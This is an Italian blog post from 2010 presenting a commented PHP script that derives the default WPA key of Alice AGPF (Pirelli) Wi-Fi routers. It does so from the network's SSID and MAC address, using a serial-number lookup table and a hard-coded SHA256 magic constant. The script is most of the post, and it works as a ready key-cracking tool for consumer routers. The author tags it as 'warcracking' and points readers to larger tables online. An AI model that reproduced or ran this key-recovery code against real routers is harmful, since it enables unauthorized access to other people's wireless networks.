Date: 2010-06-06 18:57:26
Author: evilsocket
Categories: Exploiting, Hacking, PHP, Programmazione, Sorgenti, Wardriving
Tags: AGPF, algoritmo, alice, chiave, cracking, generazione, hack, key, pirelli, warcracking, wifi, win32, wpa, wpa2
Title: Script per il calcolo della chiave WPA dei router Alice Gate VoIP 2 Plus Wi-Fi 

Come preannunciato nell'<a href="http://www.evilsocket.net/script-per-il-calcolo-della-chiave-wpa-dei-router-fastweb-pirelli.html" target="_blank">artcolo precedente</a> sui router Fastweb, mi sono adoperato a studiare la <a href="http://wifiresearchers.wordpress.com/2010/06/02/alice-agpf-lalgoritmo/" target="_blank">brillante ricerca</a> della WhiteHatCrew sui router di Alice, denominati AGPF, al fine di implementare uno script per la generazione della chiave WPA di default.

<break>

A differenza del caso FastWeb, il quale per il calcolo si basava solo sull SSID della rete, in questo caso ci serve anche il seriale del router che, come dimostrato dalla ricerca precedentemente linkata, è ricavabile tramite un sistema a due incognite dal quale, la WHC, ha tirato fuori una tabella di valori noti, tabella che ho inserito nel mio script.

Di conseguenza, a meno che il lettore non ampli la propria tabella a mano, seguendo le indicazioni della WHC, lo script funzionerà solo con SSID del tipo :
<ul>
	<li>Alice-96xxxxxx</li>
	<li>Alice-93xxxxxx</li>
	<li>Alice-56xxxxxx</li>
	<li>Alice-55xxxxxx</li>
	<li>Alice-54xxxxxx</li>
	<li>Alice-48xxxxxx</li>
	<li>Alice-46xxxxxx</li>
</ul>
Sono sicuro cmq che cercando nella rete delle tabelle un po più estese si trovano ;)

Lo script è commentato (come il precedente), in modo tale il lettore avrà la possibilità non solo di utilizzarlo, ma anche di capirlo, che è la cosa che più mi preme al fine di una condivisione libera dell'informazione e della cultura informatica in generale.

Enjoy.

<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&amp;lt;?php<br />
/***************************************************************************<br />
&nbsp;* &nbsp; Alice AGPF WPA Discovery &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
&nbsp;* &nbsp; by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net &nbsp; &nbsp; &nbsp;*<br />
&nbsp;* &nbsp; based on &amp;lt;http://wifiresearchers.wordpress.com/&amp;gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; This program is free software; you can redistribute it and/or modify &nbsp;*<br />
&nbsp;* &nbsp; it under the terms of the GNU General Public License as published by &nbsp;*<br />
&nbsp;* &nbsp; the Free Software Foundation; either version 2 of the License, or &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; (at your option) any later version. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; This program is distributed in the hope that it will be useful, &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; but WITHOUT ANY WARRANTY; without even the implied warranty of &nbsp; &nbsp; &nbsp; &nbsp;*<br />
&nbsp;* &nbsp; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. &nbsp;See the &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; GNU General Public License for more details. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; You should have received a copy of the GNU General Public License &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; along with this program; if not, write to the &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; Free Software Foundation, Inc., &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;* &nbsp; 59 Temple Place - Suite 330, Boston, MA &nbsp;02111-1307, USA. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
&nbsp;***************************************************************************/<br />
<br />
/*<br />
&nbsp;* Tabella per il calcolo del seriale.<br />
&nbsp;*<br />
&nbsp;* First SSID digits =&amp;gt; ( SN1, k, Q )<br />
&nbsp;*/<br />
$SN_TABLE &nbsp; = array( '96' =&amp;gt; array( '69102', 13, 96017051 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'93' =&amp;gt; array( '69101', 13, 92398366 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'56' =&amp;gt; array( '67902', 13, 54808800 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'55' =&amp;gt; array( '67904', 8, &nbsp;55164449 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'54' =&amp;gt; array( '67903', 8, &nbsp;52420689 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'48' =&amp;gt; array( '67903', 8, &nbsp;47896103 ),<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'46' =&amp;gt; array( '67902', 13, 39015145 ) );<br />
/*<br />
&nbsp;* Numeri magici da utilizzare per il calcolo dell'SHA256.<br />
&nbsp;*/<br />
$ALIS &nbsp; &nbsp; &nbsp; = &quot;\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8&quot;;<br />
/*<br />
&nbsp;* Tabella di conversione da hash a wpa.<br />
&nbsp;*/<br />
$CONV_TABLE = &quot;0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuv&quot;.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;wxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123&quot;;<br />
/* <br />
&nbsp;* SSID della rete.<br />
&nbsp;*/<br />
$SSID &nbsp; &nbsp; &nbsp; = &quot;Alice-96154825&quot;;<br />
/*<br />
&nbsp;* MAC address del router.<br />
&nbsp;*/<br />
$MAC &nbsp; &nbsp; &nbsp; &nbsp;= &quot;\x00\x23\x8E\x01\x02\x03&quot;;<br />
/*<br />
&nbsp;* Calcolo il seriale in base al SSID e alla tabella dei valori noti.<br />
&nbsp;*/<br />
$SN &nbsp; &nbsp; &nbsp; &nbsp; = SSID2SN($SSID);<br />
/*<br />
&nbsp;* Calcolo SHA256( MagicN + SN + MAC )<br />
&nbsp;*/<br />
$hash &nbsp; &nbsp; &nbsp; = SHA256( $ALIS.$SN.$MAC );<br />
/*<br />
&nbsp;* Converto la stringa dell'hash in un array di byte.<br />
&nbsp;*/<br />
$bytes &nbsp; &nbsp; &nbsp;= hash2bytes($hash);<br />
/*<br />
&nbsp;* Trovo la WPA utilizzando i primi 24 byte dell'hash come indici della tabella di covnersione.<br />
&nbsp;*/<br />
$wpa &nbsp; = &quot;&quot;;<br />
for( $i = 0; $i &amp;lt; 24; $i++ ){<br />
&nbsp; &nbsp; $wpa .= $CONV_TABLE[ $bytes[$i] ];<br />
}<br />
<br />
echo &quot;WPA : $wpa\n&quot;;<br />
<br />
/*<br />
&nbsp;* Funzione per risalire al seriale del router partendo dal suo SSID e utilizzando<br />
&nbsp;* le tabelle dei valori noti.<br />
&nbsp;*/<br />
function SSID2SN( $ssid ){<br />
&nbsp; &nbsp; global $SN_TABLE;<br />
&nbsp; &nbsp; /*<br />
&nbsp; &nbsp; &nbsp;* Prelevo il numero intero dall'SSID e ne prendo le prime due cifre<br />
&nbsp; &nbsp; &nbsp;* per verificare che il router sia presente nella tabella.<br />
&nbsp; &nbsp; &nbsp;*/<br />
&nbsp; &nbsp; preg_match_all( &quot;/^Alice\-([0-9]+)/&quot;, $ssid, $m );<br />
<br />
&nbsp; &nbsp; $ssidn = $m[1][0];<br />
&nbsp; &nbsp; $id &nbsp; &nbsp;= substr( $ssidn, 0, 2 );<br />
<br />
&nbsp; &nbsp; if( isset( $SN_TABLE[$id] ) ){<br />
&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Ok, il router è presente nella tabella, prelevo la prima parte del seriale e<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* le costanti k e Q da utilizzare nell'equazione finale.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
&nbsp; &nbsp; &nbsp; &nbsp; $sn1 = $SN_TABLE[$id][0];<br />
&nbsp; &nbsp; &nbsp; &nbsp; $k &nbsp; = $SN_TABLE[$id][1];<br />
&nbsp; &nbsp; &nbsp; &nbsp; $Q &nbsp; = $SN_TABLE[$id][2];<br />
&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* La seconda parte del seriale equivale a :<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* &nbsp; &nbsp; &nbsp;(SSID - Q) / k<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
&nbsp; &nbsp; &nbsp; &nbsp; $sn2 = ((int)$ssidn - $Q) / $k; <br />
&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Restituisco il seriale completo.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
&nbsp; &nbsp; &nbsp; &nbsp; return $sn1.'X'.sprintf( &quot;%07s&quot;, $sn2 );<br />
&nbsp; &nbsp; }<br />
&nbsp; &nbsp; /*<br />
&nbsp; &nbsp; &nbsp;* Router non presente nella tabella.<br />
&nbsp; &nbsp; &nbsp;*/<br />
&nbsp; &nbsp; else{<br />
&nbsp; &nbsp; &nbsp; &nbsp; die( &quot;La serie 'Alice-$id******' non è presente nella tabella e non è supportata.\n&quot; );<br />
&nbsp; &nbsp; }<br />
}<br />
/*<br />
&nbsp;* Funzione per il calcolo di un hash SHA256.<br />
&nbsp;*/<br />
function SHA256( $phrase ){<br />
&nbsp; &nbsp; return bin2hex( mhash( MHASH_SHA256, $phrase ) );<br />
}<br />
/*<br />
&nbsp;* Funzione per convertire un hash in un array di byte interi.<br />
&nbsp;*/<br />
function hash2bytes( $hash ){<br />
&nbsp; &nbsp; preg_match_all( &quot;/[a-f0-9]{2}/i&quot;, $hash, $hash_bytes );<br />
&nbsp; &nbsp; $bytes = array();<br />
&nbsp; &nbsp; foreach( $hash_bytes[0] as $byte ){<br />
&nbsp; &nbsp; &nbsp; &nbsp; $bytes[] = hexdec($byte);<br />
&nbsp; &nbsp; }<br />
&nbsp; &nbsp; <br />
&nbsp; &nbsp; return $bytes;<br />
}<br />
<br />
?&amp;gt;</div></div>

</pre>
